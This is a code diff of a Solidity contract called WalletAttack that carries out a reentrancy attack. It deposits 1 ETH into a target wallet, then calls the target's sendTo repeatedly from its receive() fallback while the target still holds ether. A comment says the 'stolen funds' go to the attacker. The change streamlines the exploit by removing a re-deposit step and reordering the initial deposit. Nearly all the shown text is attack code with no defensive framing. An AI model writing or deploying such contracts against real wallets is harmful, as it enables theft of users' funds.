@@ -22,20 +22,8 @@ contract WalletAttack {
 
     // Fallback function to enable the reentrancy attack
     receive() external payable {
-        // If we're attacking and have ETH to withdraw
         if (attacking && address(target).balance > 0) {
-            // First withdraw our balance before it's cleared
             target.sendTo(payable(address(this)));
-            
-            // Then deposit a small amount back to keep the attack going
-            if (msg.value > 0) {
-                uint256 depositAmount = 0.1 ether;
-                if (depositAmount <= msg.value) {
-                    target.deposit{value: depositAmount}();
-                    // Then withdraw it again before our balance is cleared
-                    target.sendTo(payable(address(this)));
-                }
-            }
         }
     }
 
@@ -50,16 +38,12 @@ contract WalletAttack {
         
         target = _target;
         
+        // Deposit 1 ETH to get access to the wallet
+        target.deposit{value: ATTACK_AMOUNT}();
+        
         // Start the attack
         attacking = true;
-
-        // First deposit to get access to the wallet
-        target.deposit{value: ATTACK_AMOUNT}();
-
-        // Now withdraw our deposit, which will trigger the reentrancy attack
         target.sendTo(payable(address(this)));
-
-        // Stop the attack
         attacking = false;
         
         // Send all stolen funds back to the attacker
